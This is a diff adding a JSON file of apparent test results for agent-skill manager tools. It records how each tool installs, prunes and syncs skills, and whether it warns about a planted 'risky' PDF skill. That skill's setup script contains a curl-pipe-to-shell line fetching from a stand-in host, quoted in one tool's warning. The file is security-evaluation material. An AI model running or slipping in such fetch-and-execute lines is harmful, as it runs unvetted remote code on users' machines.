@@ -1,0 +1,786 @@
+[
+ {
+  "repo": "MoizIbnYousaf/ai-agent-skills",
+  "kind": "cli",
+  "stars": 1147,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.1,
+  "installed_20": true,
+  "risky": "installed without a word",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated in the tool's own README/docs. Only a bundled library skill (skills/best-practices/references/best-practices-guide.md) mentions that Claude loads skills on demand.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npx -y ai-agent-skills (run via npx as the README directs; no global install needed)",
+   "step1": {
+    "done": true,
+    "how": "npx -y ai-agent-skills install ./input/library --yes --format text",
+    "note": "Local path accepted directly; all 20 installed to ~/.claude/skills. installed-20: 21482 context tokens (baseline 21137)."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "Found: pdf-tools-pro - Merge, split and compress PDF files. Run scripts/setup.sh once after installing to fetch the PDF engine.\n  ✓ pdf-tools-pro\n\nInstalled 1 skill(s)",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "Command: npx -y ai-agent-skills install ./input/risky/pdf-tools-pro --format text (no --yes). It only echoed the skill's own frontmatter description, then copied SKILL.md and scripts/setup.sh into ~/.claude/skills/pdf-tools-pro with no source path, script listing, warning or prompt. setup.sh was not run."
+   },
+   "step3": {
+    "done": true,
+    "how": "npx -y ai-agent-skills list --installed; then npx -y ai-agent-skills uninstall <name> --yes for each of the 16 unneeded skills (including pdf-tools-pro)",
+    "could_list": true,
+    "note": "There's no bulk or keep-only removal, so I uninstalled one at a time. 5 remain; pruned: 21277 context tokens."
+   },
+   "step4": {
+    "done": true,
+    "how": "npx -y ai-agent-skills install ./input/library --skill csv-cleaner --skill sql-explainer --skill git-commit-message --skill pr-description --skill readme-polisher --agent codex --yes",
+    "note": "Uses the legacy --agent codex target (~/.codex/skills). This is a separate install from the source, not a sync of the Claude set. list --installed --agent codex shows the 5."
+   },
+   "loads_on_demand": "not stated in the tool's own README/docs. Only a bundled library skill (skills/best-practices/references/best-practices-guide.md) mentions that Claude loads skills on demand."
+  },
+  "commit": "6d95c788aa22"
+ },
+ {
+  "repo": "luongnv89/asm",
+  "kind": "cli",
+  "stars": 952,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 3.7,
+  "installed_20": true,
+  "risky": "warned, asked to confirm",
+  "risky_installed": false,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "README 'Attention budget': every installed skill's frontmatter description is resident in the agent's prompt on every message; the full SKILL.md body is only paid when the skill fires. asm does not change that loading itself. It measures it (asm stats --tokens, asm audit residency) and offers ways to avoid residency: asm get <skill> prints a body on demand with no install, and asm install --library / asm deactivate / asm disable keep skills out of resident context.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npm install -g agent-skill-manager (README command; failed with EACCES on /usr/local, so re-run as: npm install -g --prefix ~/.npm-global agent-skill-manager) -> asm v2.21.0",
+   "step1": {
+    "done": true,
+    "how": "asm install ~/work/input/library --all -p claude -s global -y",
+    "note": "Installs directly from a local folder (no git needed). All 20 copied to ~/.claude/skills. measure: 21137 -> 21482 context tokens."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "[Step 1/8] Parsing source\n  local: /home/runner/work/input/risky/pdf-tools-pro\n\n[Step 2/8] Selecting provider\n\n[Step 3/8] Selecting scope\n  scope: global (~/.claude/skills)\n\n[Step 4/8] Reading local source\n  /home/runner/work/input/risky/pdf-tools-pro\n\n[Step 5/8] Scanning for skills\n  Found: pdf-tools-pro v0.0.0\n\n[Step 6/8] Inspecting skills\n  pdf-tools-pro v0.0.0 [NEW]\n\n  Install preview:\n    Name:        pdf-tools-pro\n    Version:     0.0.0\n    Description: Merge, split and compress PDF files. Run scripts/setup.sh once after installing to fetch the PDF engine.\n    Source:      /home/runner/work/input/risky/pdf-tools-pro\n    Tool:    Claude Code (claude)\n    Scope:       Global\n    Target:      /home/runner/.claude/skills/pdf-tools-pro\n    Status:      [NEW]\n    Risk:        [!] High Risk\n\n  Security warnings:\n\n    [Shell commands] (1 match)\n      SKILL.md:11 -- After installing, run `bash scripts/setup.sh` once. It downloads the PDF engine.\n\n    [External URLs] (1 match)\n      scripts/setup.sh:4 -- curl -fsSL https://example.invalid/pdf-engine/install.sh | sh\n\n[Step 7/8] Installing\n\n  [!] Install \"pdf-tools-pro\"? Some have high-risk patterns. [y/N] \nAborted.",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": true,
+    "asked_confirmation": true,
+    "blocked": false,
+    "note": "Command: asm install ~/work/input/risky/pdf-tools-pro -p claude -s global (no --yes, run in a pseudo-terminal, Enter pressed to take the default). It showed the source path, flagged High Risk, and quoted scripts/setup.sh:4 (the curl | sh line) as a security match. It did not list the scripts folder as such. The high-risk prompt defaults to [y/N], so the default aborted the install. Without a TTY it exited with code 2: 'Cannot prompt for confirmation in non-interactive mode. Use --yes to skip.' This is a confirmation gate, not a hard block: --yes would have installed it. Skill not installed; setup.sh never run."
+   },
+   "step3": {
+    "done": true,
+    "how": "asm list / asm list --json; then asm uninstall <name> -y for each of the 15 other skills plus pdf-tools-pro",
+    "could_list": true,
+    "note": "5 skills remain (csv-cleaner, sql-explainer, git-commit-message, pr-description, readme-polisher). 'asm uninstall pdf-tools-pro -y' returned 'Error: Skill \"pdf-tools-pro\" not found or nothing to remove.' because it was never installed. Each uninstall printed 'Cleaned AGENTS.md block in: /home/runner/.amp/AGENTS.md' although that file does not exist (misleading message). measure: 21277 tokens, 5 skills."
+   },
+   "step4": {
+    "done": true,
+    "how": "asm install ~/work/input/library/<skill> -p codex -s global -y for each of the 5 skills",
+    "note": "There is no sync command. Per-tool install with -p codex wrote to ~/.codex/skills; asm list shows each skill as [Claude Code] [Codex]. Help says local-folder sources always reinstall (copy) rather than symlink; asm install --library + asm activate is the documented shared alternative. Claude Code context unchanged (21277)."
+   },
+   "loads_on_demand": "README 'Attention budget': every installed skill's frontmatter description is resident in the agent's prompt on every message; the full SKILL.md body is only paid when the skill fires. asm does not change that loading itself. It measures it (asm stats --tokens, asm audit residency) and offers ways to avoid residency: asm get <skill> prints a body on demand with no install, and asm install --library / asm deactivate / asm disable keep skills out of resident context."
+  },
+  "commit": "a01a1839fc51"
+ },
+ {
+  "repo": "knoxgraeme/skillfish",
+  "kind": "cli",
+  "stars": 322,
+  "grade": "safe",
+  "ran": true,
+  "untested": "github-only",
+  "reason": "Installs only from GitHub (owner/repo); the test skills were local folders, so install, prune and sync were not tested.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npm i -g skillfish (failed with EACCES on /usr/local; succeeded after `npm config set prefix ~/.npm-global`) -> skillfish 1.0.39",
+   "step1": {
+    "done": false,
+    "how": "skillfish add ~/work/input/library --all --agent \"Claude Code\" --yes; also tried a git-init copy: skillfish add /tmp/libgit ... and skillfish add file:///tmp/libgit ...",
+    "note": "skillfish only accepts GitHub owner/repo sources and fetches via api.github.com. Local paths failed with 'Invalid repository format. Use: owner/repo', and file:// failed with 'Invalid path component...'. A local git repo doesn't help because the tool never runs git. 0 skills installed."
+   },
+   "step2": {
+    "done": false,
+    "tool_output": "Installing skill from: runner/work/input/risky/pdf-tools-pro\nInvalid repository format. Use: owner/repo",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "Rejected only because it is a local path, not because of the script. The source has no script detection or warning (README: 'skillfish does not vet third-party skills'). setup.sh was not run."
+   },
+   "step3": {
+    "done": false,
+    "how": "skillfish list; skillfish remove pdf-tools-pro --yes",
+    "could_list": true,
+    "note": "list worked: it detected Claude Code and reported 'No skills installed'. remove reported 'Skill \"pdf-tools-pro\" not found'. Nothing to prune because steps 1-2 installed nothing. remove <name> / remove --all exist and would have done this."
+   },
+   "step4": {
+    "done": null,
+    "how": "not run",
+    "note": "Codex is a supported agent (~/.codex/skills), but only via `skillfish add <owner/repo> --agent Codex` from GitHub, and only for detected agents (~/.codex does not exist here). There is no command to sync installed or local skills from one agent to another. Skipped; the 'synced' measurement was not run."
+   },
+   "loads_on_demand": "README says skills are 'loaded on demand to extend capabilities' (in its general description of Agent Skills). The tool itself does nothing to control loading; it only copies skill folders into each agent's skills directory."
+  },
+  "risky": "-",
+  "minutes": 1.6
+ },
+ {
+  "repo": "VintLin/skill-flow",
+  "kind": "cli",
+  "stars": 262,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.5,
+  "installed_20": true,
+  "risky": "installed without a word",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": false,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npm install -g --prefix ~/.npm-global skill-flow  (README says `npm install -g skill-flow`; that failed with EACCES on /usr/local/lib/node_modules, so the same global install was redirected to a user prefix; skill-flow 1.6.10)",
+   "step1": {
+    "done": true,
+    "how": "skill-flow add ~/work/input/library --agent claude-code --yes",
+    "note": "Local folder accepted directly; output: 'Added library@local [library] with 20/20 skills enabled, 1 agent selected.' 20 symlinks created in ~/.claude/skills pointing into ~/.skillflow/source/local/library. Context 21137 -> 21482 tokens."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "Preparing source\nSource prepared\nApplying projections\nAdded pdf-tools-pro@local [pdf-tools-pro] with 1/1 skills enabled, 1 agent selected.",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note_detail": "Command: skill-flow add ~/work/input/risky/pdf-tools-pro --agent claude-code --yes (--yes as in step 1). The output only labels it '@local' and gives no path. It did not mention scripts/setup.sh, did not warn and did not block (exit 0). `skill-flow doctor` afterwards: 'HEALTHY No issues detected.' setup.sh was never run."
+   },
+   "step3": {
+    "done": true,
+    "how": "skill-flow list --ids / list --json; skill-flow uninstall pdf-tools-pro; then printf '{\"protocolVersion\":\"1.0\",\"command\":\"apply\",\"payload\":{\"sourceId\":\"library\",\"draft\":{\"selectedLeafIds\":[\"library:csv-cleaner\",\"library:sql-explainer\",\"library:git-commit-message\",\"library:pr-description\",\"library:readme-polisher\"],\"enabledTargets\":[\"claude-code\"]}}}' | skill-flow bridge --json",
+    "could_list": true,
+    "note": "uninstall/remove only work on whole groups (source IDs). The plain CLI has no non-interactive way to deselect single skills; `config` is an interactive TUI. The documented machine bridge (`bridge --json`, command 'apply') did it. 'skill-flow uninstall pdf-tools-pro@local' failed because the ID is 'pdf-tools-pro'. Result: 5 skills left in ~/.claude/skills; context 21277 tokens. `list` still shows 'library ... 20 skills', meaning skills in the source, not deployed ones."
+   },
+   "step4": {
+    "done": false,
+    "how": "Same bridge 'apply' call with enabledTargets [\"claude-code\",\"codex\"]; retried with SKILL_FLOW_TARGET_CODEX=$HOME/.codex/skills",
+    "note": "Codex is one of the tool's 32 built-in targets, but the bridge returned ok:true while every Codex action was 'blocked: Target directory not found. Set codex target env override to enable it.' The tool only installs into an agent folder that already exists, and Codex is not installed here (~/.codex is missing). The env override did not help. I did not create the folder by hand. No skills were given to Codex. Note: the top-level ok:true hides the block, and `list` now shows '2 targets' even though nothing went to Codex. `measure synced` still records 5 skills in ~/.claude/skills (21277 tokens)."
+   },
+   "loads_on_demand": "not stated"
+  },
+  "commit": "443fec81a44b"
+ },
+ {
+  "repo": "Karanjot786/agent-skills-cli",
+  "kind": "cli",
+  "stars": 182,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.7,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "Not stated as a property of how agents load skills. The README only advertises `skills budget -b <tokens>` ('Smart context budget manager — load only the most relevant skills' / 'Smart token-aware skill selection') and `skills assets` ('fetch assets for a skill on-demand from GitHub'). Neither was used here.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npm install -g --prefix ~/.npm-global agent-skills-cli  (README says `npm install -g agent-skills-cli`; plain form failed with EACCES on /usr/local, so a user prefix was used; v1.1.9)",
+   "step1": {
+    "done": true,
+    "how": "for d in *; do skills install ./$d -g -a claude -y; done  (run inside a staging copy of the library)",
+    "note": "First tried `skills install ~/work/input/library -g -a claude -y`: the tool installed the whole parent folder as ONE skill named 'library' (nested, not discoverable). Then `skills remove library -g -a claude -y` DELETED THE ORIGINAL SOURCE FOLDER ~/work/input/library. Local installs record the source path as canonicalPath, and remove runs rm -rf on it (src/cli/commands/remove.ts:177-178). I restored the input from /in/input/library, then installed each skill one at a time from a disposable staging copy. Local installs need one command per skill folder. measure: 21482 tokens, 20 skills."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "📦 Installing from local directory: pdf-tools-pro\n\n- Installing to Claude Code...\n✔ Claude Code: /home/runner/.claude/skills/pdf-tools-pro\n\n✨ Installed pdf-tools-pro",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "'Source' here is only the basename ('local directory: pdf-tools-pro'), not the full path. The skill was copied with scripts/setup.sh and there was no prompt (run without -y). setup.sh was not executed. measure: 21485 tokens, 21 skills."
+   },
+   "step3": {
+    "done": true,
+    "how": "skills check -g (list); skills remove accessibility-check api-docs-writer changelog-writer cron-explainer dependency-updater dockerfile-review env-var-auditor i18n-extractor json-schema-maker log-summarizer meeting-notes perf-profiler-notes regex-helper typo-finder unit-test-scaffold pdf-tools-pro -g -y",
+    "could_list": true,
+    "note": "Removed 16, kept 5. Removal also rm -rf's each skill's recorded local source folder (the staging copies here). measure: 21277 tokens, 5 skills."
+   },
+   "step4": {
+    "done": true,
+    "how": "for s in csv-cleaner sql-explainer git-commit-message pr-description readme-polisher; do skills install ./$s -g -a claude,codex -y; done",
+    "note": "Copied to ~/.codex/skills/<name> (independent copies, not symlinks). `skills export -t codex` also exists. measure synced: 21277 tokens, 5 skills in ~/.claude/skills."
+   },
+   "loads_on_demand": "Not stated as a property of how agents load skills. The README only advertises `skills budget -b <tokens>` ('Smart context budget manager — load only the most relevant skills' / 'Smart token-aware skill selection') and `skills assets` ('fetch assets for a skill on-demand from GitHub'). Neither was used here."
+  },
+  "commit": "956140bfce17"
+ },
+ {
+  "repo": "eljulians/skillfile",
+  "kind": "cli",
+  "stars": 173,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 7.7,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": false,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21486,
+  "tokens_pruned": 21486,
+  "extra_tokens_20": 349,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated (README, SPEC.md and CLI help say nothing about on-demand or progressive skill loading or context cost; the README says only that skillfile installs markdown where AI tools expect it and does not sandbox or verify content)",
+  "report": {
+   "installed_tool": true,
+   "install_command": "cargo install --locked skillfile  (README's documented alternative; Rust toolchain installed first via rustup. The README's primary `curl -fsSL https://github.com/eljulians/skillfile/releases/latest/download/install.sh | sh` installed v1.9.2 but the prebuilt aarch64 binary needs GLIBC_2.39; host has 2.36, so it would not run)",
+   "step1": {
+    "done": true,
+    "how": "cd ~/work/proj && git init && skillfile init (interactive, driven via pty: claude-code, scope global, personal config, skipped tokens); then `skillfile add local skill ../input/library/<name>` for each of the 20 folders; `skillfile install`",
+    "note": "`skillfile init` refuses to run without a TTY. Pointing `add local` at .../SKILL.md names the entry 'SKILL' (from the filename stem), so the first attempt deployed ~/.claude/skills/SKILL. `skillfile remove SKILL` dropped it from the Skillfile but left the deployed folder, so ~/.claude/skills ended with 21 dirs (the 20 skills plus the orphan SKILL). Passing directory paths named the skills correctly. Installs are copies, not symlinks."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "  local/skill/pdf-tools-pro: local — skipping\n  pdf-tools-pro -> /home/runner/.claude/skills/pdf-tools-pro\nAdded: local  skill  ../input/risky/pdf-tools-pro\nInstalled to: claude-code (global)",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": false,
+    "how": "skillfile list; skillfile remove <name> for the 15 unneeded library skills + pdf-tools-pro; skillfile install",
+    "could_list": true,
+    "note": "`skillfile list` and `status` show the declared entries. `remove` only takes an entry out of the Skillfile, the lock and the cache. It does not delete deployed skill folders, and `install` does not prune them either. The Skillfile now holds the 5 wanted skills, but all 20 skills plus pdf-tools-pro (with scripts/setup.sh) and the orphan SKILL are still in ~/.claude/skills (22 dirs). I found no prune or uninstall command in the CLI or source. Per the rules I did not delete anything by hand."
+   },
+   "step4": {
+    "done": true,
+    "how": "skillfile init (added codex, global scope, personal config) then skillfile install",
+    "note": "Deployed exactly the 5 Skillfile skills to ~/.codex/skills. Because the Skillfile was already pruned, Codex got only the 5. claude-code was redeployed too, but its stale folders stayed."
+   },
+   "loads_on_demand": "not stated (README, SPEC.md and CLI help say nothing about on-demand or progressive skill loading or context cost; the README says only that skillfile installs markdown where AI tools expect it and does not sandbox or verify content)"
+  },
+  "commit": "c37d7ca68d32"
+ },
+ {
+  "repo": "activeing123/mcptoon",
+  "kind": "cli",
+  "stars": 214,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.0,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21487,
+  "tokens_pruned": 21293,
+  "extra_tokens_20": 350,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "README: 'Skills the same way. One resident pointer (39 tokens) plus one lookup (501 tokens) replaces loading every SKILL.md in full' through `mcptoon skills manifest` and `mcptoon skills resolve`. In practice skills synced into ~/.claude/skills are still normal Claude Code skills, so their frontmatter is loaded as usual (measured 21137 -> 21487 tokens with 21 skills). The on-demand path only applies if the agent uses `mcptoon skills resolve` instead of the native skills folder.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "python3 -m venv ~/.mcptoon-venv && ~/.mcptoon-venv/bin/pip install ~/src   (README's PEP 668 venv option; plain 'pip install -e ~/src' was refused with externally-managed-environment and pipx isn't installed)",
+   "step1": {
+    "done": true,
+    "how": "mcptoon skills sync ~/work/input/library ~/.claude/skills",
+    "note": "mcptoon has no per-skill 'install from path'. Its model is one source catalog synced as symlinks into agent skill folders. 20 symlinks were created in ~/.claude/skills. On first run it also auto-installed its own 'mcptoon' skill there (a real directory), so the measurement showed 21 skills. Token count went from 21137 to 21487."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "mcptoon skills sync\n  source: /home/runner/work/input/risky  (1 skills)\n  /home/runner/.claude/skills\n    +1 new, 20 left alone (other manager)\n\n  one source, many views — edits at the source are already live.",
+    "showed_source": true,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": true,
+    "how": "mcptoon skills index; mcptoon skills list; for each unwanted skill: mcptoon skills remove ~/work/input/library <name> (and mcptoon skills remove ~/work/input/risky pdf-tools-pro); then mcptoon skills sync ~/work/input/library ~/.claude/skills and mcptoon skills sync ~/work/input/risky ~/.claude/skills to prune the links",
+    "could_list": true,
+    "note": "skills list only works after 'skills index'. 'skills remove' works at the source: it moves the skill folder out of the source (here ~/work/input/library and ~/work/input/risky) into ~/work/input/_archive/removed/, and the next sync prunes the links. That means the input material itself was changed, though the move can be undone. I also removed mcptoon's own skill with 'mcptoon skills remove ~/.claude/skills mcptoon', but the tool's first-run self-heal put it back on the next command. Final state: 5 wanted skills plus 'mcptoon' (6 total). Tokens: 21293."
+   },
+   "step4": {
+    "done": true,
+    "how": "mcptoon skills sync ~/work/input/library ~/.codex/skills",
+    "note": "5 symlinks were created in ~/.codex/skills, pointing at the same source. The sync output did not print an added count, so I confirmed with ls. Running sync without an explicit view would also write to ~/.agents, ~/.cursor, ~/.catpaw and ~/.codeium/windsurf skill folders."
+   },
+   "loads_on_demand": "README: 'Skills the same way. One resident pointer (39 tokens) plus one lookup (501 tokens) replaces loading every SKILL.md in full' through `mcptoon skills manifest` and `mcptoon skills resolve`. In practice skills synced into ~/.claude/skills are still normal Claude Code skills, so their frontmatter is loaded as usual (measured 21137 -> 21487 tokens with 21 skills). The on-demand path only applies if the agent uses `mcptoon skills resolve` instead of the native skills folder."
+  },
+  "commit": "5f73721cfe4f"
+ },
+ {
+  "repo": "shanliuling/skills-link",
+  "kind": "sync",
+  "stars": 198,
+  "grade": "safe",
+  "ran": true,
+  "untested": "github-only",
+  "reason": "Adds skills only from GitHub URLs; the test skills were local folders, so install, prune and sync were not tested.",
+  "report": {
+   "installed_tool": true,
+   "install_command": "npm i -g skills-link (README command; failed with EACCES on /usr/local, so ran: npm i -g --prefix ~/.npm-global skills-link -> v1.3.0, same as ~/src), then first-time setup `skills-link` with all defaults (English, paths correct, no GitHub) -> master dir ~/.local/share/aiskills, ~/.claude/skills symlinked to it",
+   "step1": {
+    "done": false,
+    "how": "skills-link add ~/work/gitcopy/library  and  skills-link add file:///home/runner/work/gitcopy/library (git-init'd copy of the library)",
+    "note": "Both rejected with '✗ Invalid GitHub address'. `add` only accepts github.com URLs or user/repo shorthand (src/commands/add.ts parseRepoUrl). Setup/main command only imports skills already present in agent skill dirs (~/.claude/skills etc.); there is no command to import from a local folder. 0 skills installed."
+   },
+   "step2": {
+    "done": false,
+    "tool_output": "✗ Invalid GitHub address",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false,
+    "note": "Ran `skills-link add ~/work/gitcopy2/pdf-tools-pro` (git-init'd copy). Rejected only because it is not a GitHub URL, not for safety reasons. Source review of add.ts: for a GitHub repo it clones, finds SKILL.md dirs and copies the whole folder (scripts included) into the master dir with no script listing, warning, or confirmation (only an overwrite prompt if the name already exists). setup.sh was never run."
+   },
+   "step3": {
+    "done": false,
+    "how": "skills-link list; skills-link remove",
+    "could_list": true,
+    "note": "list printed '⚠ No local skills found'; remove printed '⚠ No skills in master directory' since nothing was installed. remove is interactive (checkbox multi-select + confirm, default No) and deletes from the master dir, so it could prune in principle."
+   },
+   "step4": {
+    "done": false,
+    "how": "skills-link app (toggled Codex on -> '✔ Codex enabled'), then skills-link",
+    "note": "Codex is a supported agent (~/.codex/skills), and enabling it worked. But the main command reports Codex as 'not installed' because ~/.codex doesn't exist, so it created no link. There were also no skills to share. Nothing was made available to Codex."
+   },
+   "loads_on_demand": "not stated"
+  },
+  "risky": "-",
+  "minutes": 2.6
+ },
+ {
+  "repo": "nnnggel/skills-management",
+  "kind": "sync",
+  "stars": 128,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 4.2,
+  "installed_20": true,
+  "risky": "installed without a word",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21533,
+  "tokens_pruned": 21312,
+  "extra_tokens_20": 396,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated (the README and source say nothing about loading skills only when needed or about context/token cost; skm only creates symlinks, and loading is up to each agent)",
+  "report": {
+   "installed_tool": true,
+   "install_command": "cd ~/src && npm install && npm run build && NPM_CONFIG_PREFIX=~/.npm-global npm link   (README's from-source steps; plain `npm link` failed with EACCES on the global prefix, so a user-level prefix was used)",
+   "step1": {
+    "done": true,
+    "how": "skm (interactive, driven via a pty from ~): 1. repo -> a. Add skill -> 2. Local Directory -> /home/runner/work/input/library/<name> -> 1. Keep, repeated for all 20; then 2. list(claude) -> 'a' (select all) -> Enter",
+    "note": "skm has no CLI subcommands/flags (only --version/--config); everything goes through numbered menus and an inquirer checkbox. Local folders are copied to ~/.skills-management/repo/local__<name> and symlinked into ~/.claude/skills as local__<name> (the folder name gets a 'local__' prefix). Claude Code was detected because cwd=~ contains .claude."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "\\n=== Select Skill Type ===\n1. GitHub Repository\n2. Local Directory\n0. Return\n✔ Select option: 2\n(Enter empty to return)\n✔ Enter local skill path: /home/runner/work/input/risky/pdf-tools-pro\nCopying pdf-tools-pro to repository...\nSkill local:pdf-tools-pro added successfully.\n\\nHow to handle the original directory?\n1. Keep (do nothing)\n2. Link (replace with symlink to repo)\n3. Delete\n✔ Select option: 1\n[then in list(claude), after selecting all:]\nLinked local:accessibility-check\nLinked local:pdf-tools-pro",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": true,
+    "how": "skm: 1. repo (lists all registered skills) -> for each of the 16 unneeded skills: <number> -> 1. Delete -> confirm 'y'; then 2. list(claude) -> 'Remove broken symlinks?' default Yes -> checkbox (5 remaining, all checked) -> Enter",
+    "could_list": true,
+    "note": "Listing: repo menu lists global skills; list(claude) checkbox shows which are linked. Each delete needs its own confirmation (default No). Deleting from the repo leaves dangling symlinks in ~/.claude/skills until list(claude) is opened and its broken-link cleanup is accepted. During step 2 I first mis-aimed a checkbox keystroke and unlinked accessibility-check; I re-linked it through skm (select all) before measuring 'risky', so that run had all 21 linked."
+   },
+   "step4": {
+    "done": true,
+    "how": "Codex is not a built-in target. Used skm's documented custom 'aiTools' setting in ~/.skills-management/config.json (default 5 tools + {type: codex, skillDirs: ['.codex/skills']}), created the empty ~/.codex directory (skm only detects a tool if the skill dir's parent exists; Codex is not installed here), then skm: 3. list(codex) -> 'a' -> Enter",
+    "note": "Five symlinks created in ~/.codex/skills pointing at the same repo copies. No built-in Codex support. Because a custom aiTools list replaces the defaults, the defaults had to be copied in by hand. Codex's newer user skill dir (~/.agents/skills) would need its own entry."
+   },
+   "loads_on_demand": "not stated (the README and source say nothing about loading skills only when needed or about context/token cost; skm only creates symlinks, and loading is up to each agent)"
+  },
+  "commit": "c2d2be9aca02"
+ },
+ {
+  "repo": "kina-cmd/agent-skill-sync",
+  "kind": "sync",
+  "stars": 101,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 1.9,
+  "installed_20": true,
+  "risky": "installed without a word",
+  "risky_installed": true,
+  "pruned_to_5": false,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21485,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated",
+  "report": {
+   "installed_tool": true,
+   "install_command": "python3 -m venv ~/.venvs/skillsync && ~/.venvs/skillsync/bin/pip install ~/src  (README's `pipx install agent-skill-sync` failed: pipx not present; `pip install agent-skill-sync` refused by PEP 668 externally-managed env)",
+   "step1": {
+    "done": true,
+    "how": "skillsync --config ~/work/cfg/step1.toml sync  (config: source=~/work/input/library, target=~/.claude/skills; preceded by scan and sync --dry-run)",
+    "note": "skillsync has no 'install' command; it 'syncs' (copies) skills from configured source roots into one target root. All 20 classified A (portable); copied=20 errors=0. Local folders worked, no git needed."
+   },
+   "step2": {
+    "done": true,
+    "tool_output": "SYNC: categories=A target=/home/runner/.claude/skills\n  [copy] pdf-tools-pro -> /home/runner/.claude/skills/pdf-tools-pro  \n\ncopied=1 updated=0 errors=0\n",
+    "showed_source": false,
+    "listed_scripts": false,
+    "warned": false,
+    "asked_confirmation": false,
+    "blocked": false
+   },
+   "step3": {
+    "done": false,
+    "how": "skillsync --config ~/work/cfg/list.toml scan  (source=~/.claude/skills) for listing; no removal possible",
+    "could_list": true,
+    "note": "skillsync has no remove/uninstall command; by design it 'never deletes'. Listed 21 skills (incl. pdf-tools-pro) but none could be removed with the tool, so all 21 remain in ~/.claude/skills. No manual rm was done."
+   },
+   "step4": {
+    "done": true,
+    "how": "mkdir -p ~/.codex/skills (tool errors '[error] target root missing' otherwise); skillsync --config ~/work/cfg/step4.toml sync  (target=~/.codex/skills, five [[sources]] on ~/.claude/skills each with glob '<skill>/SKILL.md')",
+    "note": "Tool has no per-skill selection flag; used one source entry per skill glob to restrict to the five. copied=5, status shows 5 identical in ~/.codex/skills. Had to create the empty target dir first. Claude Code still has all 21 skills since step 3 could not be done."
+   },
+   "loads_on_demand": "not stated"
+  },
+  "commit": "975b219eb387"
+ },
+ {
+  "repo": "dhruvwill/skills-cli",
+  "kind": "sync",
+  "stars": 14,
+  "grade": "safe",
+  "ran": true,
+  "minutes": 2.0,
+  "installed_20": true,
+  "risky": "showed the source only",
+  "risky_installed": true,
+  "pruned_to_5": true,
+  "synced_to_codex": true,
+  "tokens_baseline": 21137,
+  "tokens_20": 21482,
+  "tokens_pruned": 21277,
+  "extra_tokens_20": 345,
+  "claude_md_added": 0,
+  "mcp_added": false,
+  "on_demand": "not stated",
+  "report": {
+   "installed_tool": true,
+   "install_command": "cd ~/src && bun install && bun link   (README 'Install from Source'; prerequisite Bun was missing and was installed first via: npm install -g --prefix ~/.local bun)",
+   "step1": {
+    "done": true,
+    "how": "for d in ~/work/input/library/*/; do skills source add \"$d\" --local; done; skills target add claude; skills sync",
